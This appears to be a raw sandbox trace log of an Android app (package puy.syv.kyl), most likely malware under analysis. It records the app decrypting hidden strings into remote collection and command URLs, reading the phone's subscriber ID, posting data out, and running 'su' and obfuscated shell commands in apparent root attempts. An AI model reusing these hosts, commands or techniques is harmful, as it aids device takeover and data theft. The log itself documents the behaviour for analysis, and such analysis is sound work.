D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml.bak]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/showad.xml.bak]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][showad.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/showad.xml]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][showad.xml] [MODE][MODE_PRIVATE] [Method][getInt] [Int][counts] [Return][0]
D/S4URC   ( 2389): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://d3pm7n2yiyhtno.cloudfront.net/pic/pic1.jpg]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s] [RETURN][int] [55]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s] [RETURN][int] [55]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [NDK] [SYSCALL] [socket] [TYPE][string] [TCP]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.intent.action.SCREEN_ON,android.intent.action.SCREEN_OFF,android.intent.action.USER_PRESENT,
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][showad.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][showad.xml] [MODE][MODE_PRIVATE] [Method][getInt] [Int][counts] [Return][0]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][oGI+hgD+C6hKohuC4BQ31z1wfyXmkvxeA0K6WupHtIladnZsBozUVBfzYQBU6nLRtlHKAucbj/A=] [Return][http://www.apps888.com/logcollect/log-information]
D/S4URC   ( 2389): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [puy.syv.kyl]
D/S4URC   ( 2389): [NDK] [SYSCALL] [socket] [TYPE][string] [TCP]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][Lkf9CKG2jjE=] [Return][su]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [su]
D/S4URC   ( 2659): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][Adk5Vy1UIwxpyJSaev9RYIyOIqCChEpr] [Return][conbb od2gf04pd9]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [conbbod2gf04pd9]
D/S4URC   ( 2661): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][4GueIOC0SJEvNXUsIhscYfg1CqMzwXa3YcXx16Ogavn141ShKPgH8kaWAy7Kvq2sYRRPJXlgn9c=] [Return][.PFF kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PFFkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2663): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][V2hrBYGLuCpCY22vybRRSE8ZAU6cc5HUpxKQC12f6eN+rnsbrQCG/SKeF20OR4gChLJ6hghyCS4=] [Return][.PF kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PFkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2668): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][SP11zpOJK/LorQFhoTTgfnjmwulhemoU63u+EzEzPVCvh2vHAZggkXItomDo7yWmNLFOTNy1iok=] [Return][.PE kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PEkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2669): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [android.content.Intent] [Constructor] [IntentInfo][String] [com.android.mediashare.alarmclock]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][/cCT3081W2pFfxO8uBx/CbDC6uKRmQM+V1wTVcQsyfPA9N80XaDQbA==] [Return][http://apis.xhxt2016.com:8082/get/crt]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s] [RETURN][int] [58]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s] [RETURN][int] [58]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [NDK] [SYSCALL] [unlink] [PATH][string] [/data/data/puy.syv.kyl/cache/com.android.opengl.shaders_cache]
D/S4URC   ( 2389): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://sys.syllyq1n.com/ggview/rsddateindex]
D/S4URC   ( 2389): [SDK] [java.net] [HttpURLConnection] [Request][Method] [POST] [URL][String] [http://sys.syllyq1n.com/ggview/rsddateindex]
D/S4URC   ( 2389): [NDK] [SYSCALL] [socket] [TYPE][string] [TCP]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s] [RETURN][int] [55]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/lotuseed.s]
D/S4URC   ( 2389): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://sys.syllyq1n.com/ggview/rsddateindex]
D/S4URC   ( 2389): [SDK] [java.net] [HttpURLConnection] [Request][Method] [POST] [URL][String] [http://sys.syllyq1n.com/ggview/rsddateindex]
D/S4URC   ( 2389): [NDK] [SYSCALL] [socket] [TYPE][string] [TCP]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][lotuseed_main.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][paramupd] [Return][1535945957247]
D/S4URC   ( 2389): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][oGI+hgD+C6hKohuC4BQ31z1wfyXmkvxeA0K6WupHtIladnZsBozUVBfzYQBU6nLRtlHKAucbj/A=] [Return][http://www.apps888.com/logcollect/log-information]
D/S4URC   ( 2389): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][Lkf9CKG2jjE=] [Return][su]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [su]
D/S4URC   ( 2389): [NDK] [SYSCALL] [socket] [TYPE][string] [TCP]
D/S4URC   ( 2788): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][Adk5Vy1UIwxpyJSaev9RYIyOIqCChEpr] [Return][conbb od2gf04pd9]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [conbbod2gf04pd9]
D/S4URC   ( 2791): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][4GueIOC0SJEvNXUsIhscYfg1CqMzwXa3YcXx16Ogavn141ShKPgH8kaWAy7Kvq2sYRRPJXlgn9c=] [Return][.PFF kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PFFkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2793): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][V2hrBYGLuCpCY22vybRRSE8ZAU6cc5HUpxKQC12f6eN+rnsbrQCG/SKeF20OR4gChLJ6hghyCS4=] [Return][.PF kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PFkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2794): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][SP11zpOJK/LorQFhoTTgfnjmwulhemoU63u+EzEzPVCvh2vHAZggkXItomDo7yWmNLFOTNy1iok=] [Return][.PE kjhiu123#^%@$#9sdf8JUYD123 qzx "/system/bin/sh"]
D/S4URC   ( 2389): [SDK] [java.lang.Runtime] [exec] [Command][String] [.PEkjhiu123#^%@$#9sdf8JUYD123qzx"/system/bin/sh"]
D/S4URC   ( 2795): [NDK] [SYSCALL] [getdents] [PATH][string] [.]
D/S4URC   ( 2389): [SDK] [android.content.Intent] [Constructor] [IntentInfo][String] [com.android.mediashare.alarmclock]
D/S4URC   ( 2389): [SDK] [javax.crypto.Cipher][doFinal] [Data][/cCT3081W2pFfxO8uBx/CbDC6uKRmQM+V1wTVcQsyfPA9N80XaDQbA==] [Return][http://apis.xhxt2016.com:8082/get/crt]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files/st.jar]
D/S4URC   ( 2389): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/sdcard0/Android/data/cd/ErrorReport]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0/Android/data/cd/ErrorReport]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/storage/sdcard0/Android/data/cd/ErrorReport] [RETURN][int] [-1]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][start_millis] [Return][1535945955942]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][getIong] [Iong][duration] [Return][0]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][activities] [Return][]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][putString] [Key][activities] [Value][[rh.ov.sc.ou,31]]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][putLong] [Key][duration] [Value][31004]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][putLong] [Key][terminate_time] [Value][1535945986946]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [DesFile][/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [rename] [ORIG_PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [NEW_PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [RETURN][int] [40]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [chmod] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [MODE][int] [0660]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [lstat] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [unlink] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][commit]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][putLong] [Key][start_millis] [Value][-1]
D/S4URC   ( 2389): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][mobclick_agent_state_puy.syv.kyl.xml] [MODE][MODE_PRIVATE] [Method][putLong] [Key][end_millis] [Value][1535945986946]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [DesFile][/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [rename] [ORIG_PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [NEW_PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [RETURN][int] [40]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [chmod] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml] [MODE][int] [0660]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml]
D/S4URC   ( 2389): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [lstat] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389): [NDK] [SYSCALL] [unlink] [PATH][string] [/data/data/puy.syv.kyl/shared_prefs/mobclick_agent_state_puy.syv.kyl.xml.bak]
D/S4URC   ( 2389):  [Method][getIong] [Iong][last_fetch_location_time] [Return][0]
D/S4URC   ( 2389): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [stat] [PATH][string] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl] [RETURN][int] [-1]
D/S4URC   ( 2389): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [NDK] [SYSCALL] [access] [PATH][string] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [NDK] [SYSCALL] [open] [PATH][string] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl] [RETURN][int] [40]
D/S4URC   ( 2389): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl]
D/S4URC   ( 2389): [NDK] [SYSCALL] [chmod] [PATH][string] [/data/data/puy.syv.kyl/files/mobclick_agent_cached_puy.syv.kyl] [MODE][int] [0660]
